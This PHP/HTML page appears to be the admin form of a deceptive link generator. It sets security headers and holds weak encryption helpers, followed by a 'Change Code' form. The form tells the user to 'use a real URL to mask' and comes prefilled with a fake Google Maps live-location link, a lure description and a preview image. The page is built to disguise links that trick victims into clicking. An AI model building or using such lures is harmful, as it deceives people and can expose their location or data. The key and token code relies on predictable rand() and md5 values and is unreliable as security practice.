
<?php
// Add SSL headers
function addSSLHeaders()
{
    header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
    header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self'");
    header("X-Content-Type-Options: nosniff");
    header("X-Frame-Options: DENY");
    header("X-XSS-Protection: 1; mode=block");
    header("Referrer-Policy: no-referrer"); // New: Referrer-Policy header
    header("Feature-Policy: microphone 'none'; camera 'none'; geolocation 'none'"); // New: Feature-Policy header
}

// Call the function to add SSL headers
addSSLHeaders();

// Set a temporary cookie session to block deceptive behavior
if (!isset($_COOKIE['block_deceptive'])) {
    $expiry = time() + 3600; // Set the expiry time to 1 hour from now
    setcookie('block_deceptive', '1', $expiry, '/');
}

// Perform CSRF protection
session_start();
$csrfToken = md5(uniqid(rand(), true));
$_SESSION['csrf_token'] = $csrfToken;

// Prevent XSS attacks
function sanitizeInput($input)
{
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    return $input;
}

// Encryption functions
function generateRandomKey($length = 32)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $key .= $characters[$index];
    }
    return $key;
}

function encryptData($data, $key)
{
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
    $encryptedData = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
    $encryptedData = base64_encode($encryptedData) . '::' . base64_encode($iv);
    return $encryptedData;
}

function decryptData($encryptedData, $key)
{
    $dataParts = explode('::', $encryptedData, 2);
    if (count($dataParts) === 2) {
        $decryptedData = openssl_decrypt(base64_decode($dataParts[0]), 'AES-256-CBC', $key, 0, base64_decode($dataParts[1]));
        return $decryptedData;
    }
    return null;
}

// Get the current date
$currentDate = new DateTime();

// Calculate the expiry date (30 days from the current date)
$expiryDate = $currentDate->add(new DateInterval('P30D'));

// Format the expiry date as desired (e.g., "F j, Y")
$formattedExpiryDate = $expiryDate->format('F j, Y');
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Change Code Form</title>
  <style>
    body {
      background-color: #111;
      color: #fff;
      font-family: Arial, sans-serif;
    }
    
    .form-container {
      background-color: #222;
      padding: 20px;
      border-radius: 10px;
      max-width: 400px;
      margin: 0 auto;
      margin-top: 50px;
    }
    
    .form-container h2 {
      margin-top: 0;
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 5px;
    }
    
    .form-group input,
    .form-group textarea {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: none;
      background-color: #333;
      color: #fff;
    }
    
    .form-group input[type="submit"] {
      background-color: #00bcd4;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Change Code</h2>
    <form action="create.php" method="post">
      <div class="form-group">
        <label for="title">7132132.php</label>
        <input type="text" id="title" name="title" placeholder="Enter title [use a real URL to mask]" value="https://www.maps.google.ca/liveloca..." required>
      </div>
      <div class="form-group">
        <label for="description">Description</label>
        <input type="text" id="description" name="description" placeholder="Enter metadata description" value="Shared a Dropped pin showing current live location!">
      </div>
      <div class="form-group">
        <label for="imagelink">Image Link</label>
        <input type="text" id="imagelink" name="imagelink" placeholder="Enter a 200x200 meta preview image URL" value="https://i.ibb.co/X3w2Gy7/current.png" required>
      </div>
      <div class="form-group">
        <label for="mod">Mod [BROKEN]</label>
        <input type="text" id="mod" name="mod" placeholder="Enter 'To continue to Maps'" value="Current Location" required>
      </div>
      <div class="form-group">
        <input type="submit" value="Submit">
      </div>
    </form>
  </div>
</body>
</html>
